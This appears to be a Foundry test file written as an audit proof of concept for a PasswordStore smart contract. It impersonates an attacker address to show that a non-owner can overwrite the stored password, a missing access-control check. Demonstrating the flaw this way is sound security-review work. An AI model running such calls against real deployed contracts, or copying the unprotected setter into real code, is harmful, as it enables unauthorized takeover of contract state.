// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {PasswordStore} from "../src/PasswordStore.sol";
import {DeployPasswordStore} from "../script/DeployPasswordStore.s.sol";

contract PasswordStoreTest is Test {
    PasswordStore public passwordStore;
    DeployPasswordStore public deployer;
    address public owner;
    address public attacker;

    function setUp() public {
        deployer = new DeployPasswordStore();
        passwordStore = deployer.run();
        owner = msg.sender;
        attacker = makeAddr("attacker");
    }

    function test_poc_non_owner_set_password() public {
        // initiate the transaction from the non-owner attacker address
        vm.prank(attacker);
        string memory newPassword = "attackerPassword";
        // attacker attempts to set the password
        passwordStore.setPassword(newPassword);
        console.log("The attacker successfully set the password:", newPassword);
    }
}